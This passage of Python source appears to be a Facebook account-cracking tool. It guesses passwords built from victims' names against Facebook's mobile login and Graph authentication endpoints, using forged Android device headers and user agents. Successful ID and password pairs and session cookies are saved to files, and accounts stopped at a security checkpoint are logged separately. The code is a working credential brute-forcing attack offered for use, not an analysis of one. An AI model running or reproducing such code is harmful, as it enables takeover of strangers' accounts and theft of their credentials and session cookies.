        sys.stdout.write('\r\r\033[1;37m [SEJAD-M4] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aws=session.cookies.get_dict().keys()
                        if "c_user" in Aws:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [oussama-OK] %s | %s'%(ids,pas))
                                open('/sdcard/oussama_OK_ids_M4.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/oussama_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                           #     open('/sdcard/oussama-M4-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [oussama-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/oussama-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}                 
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SEJAD-RX] %s /  OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['11']
                        #Dalvik/2.1.0 (Linux; U; Android 11 Build/5583; ) [FBAN/268.5.8.0;FBBV/241423879;FBRV/4;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S21;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.4,width=1369,height=1764};FB_FW/3;]
                        model = device['Samsung Galaxy S21']
                        build = device['5583']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = '268.5.8.0'
                        fbpn = 'com.facebook.katana'
                        # 11 Build/; ) [FBAN/268.5.8.0;FBBV/241423879;FBRV/4;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S21;FBSV/11;FBCA/armeabi-v7a:armeabi;FB_FW/3;]
                        ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/'+fban+';FBBV/'+fbav+';FBRV/'+fbbv+';FBDM/{density=2.4,width=1369,height=1764};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'Host': 'graph.facebook.com',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                'x-fb-Client-IP': 'True',
                                'x-fb-Server-Cluster': 'True',
                                'x-fb-Request-Analytics-Tags': 'graphservice',
                                'X-FB-Friendly-Name':'ViewerReactionsMutation',
                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                                'X-FB-Net-HNI': str(random.randint(20000,40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000,40000)),
                                'X-FB-Connection-Type':'MOBILE.LTE',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()                                                
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [SEJAD-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SEJAD-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;208m [SEJAD-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SEJAD-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
try:
    menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
        print(e)